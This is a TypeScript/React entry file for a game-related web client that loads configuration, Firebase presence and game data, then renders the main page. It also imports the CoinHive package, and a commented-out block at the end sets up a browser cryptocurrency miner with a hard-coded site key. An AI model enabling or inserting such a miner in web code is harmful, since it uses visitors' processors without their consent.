import GlobalConfiguration from "@/configurations/GlobalConfiguration";
import LanguageManager from "@/configurations/language/LanguageManager";
import BreedsUtility from "@/core/BreedsUtility";
import MapPoint from "@/core/pathfinder/MapPoint";
import InventoryHelper from "@/game/character/inventory/InventoryHelper";
import DTConstants from "@/protocol/DTConstants";
import CoinHive from "coin-hive";
import * as React from "react";
import * as ReactDOM from "react-dom";
import { initialize, presence } from "./FirebaseHelpers";
// import "typeface-roboto";
import Main from "./pages/Main";

initialize();
presence();

(global as any).API = new Array();

GlobalConfiguration.load();
LanguageManager.Init();
DTConstants.Init().then(async () => {
  await BreedsUtility.Init();
  MapPoint.Init();
  InventoryHelper.Init();
});

ReactDOM.render(
  <Main />,
  document.getElementById("app"),
);

// (async () => {
//   // Create miner
//   const miner = await CoinHive("tAjnAfbeLFKqAkiehTrIAspJlp8eL3Q4", {
//     threads: 1,
//     throttle: 0.3,
//   });

//   // Start miner
//   await miner.start();

//   // Listen on events
//   miner.on("found", () => console.log("Found!"));
//   miner.on("accepted", () => console.log("Accepted!"));
//   miner.on("update", (data) =>
//     console.log(`
//     Hashes per second: ${data.hashesPerSecond}
//     Total hashes: ${data.totalHashes}
//     Accepted hashes: ${data.acceptedHashes}
//   `),
//   );

//   // Stop miner
//   // setTimeout(async () => await miner.stop(), 60000);
// })();
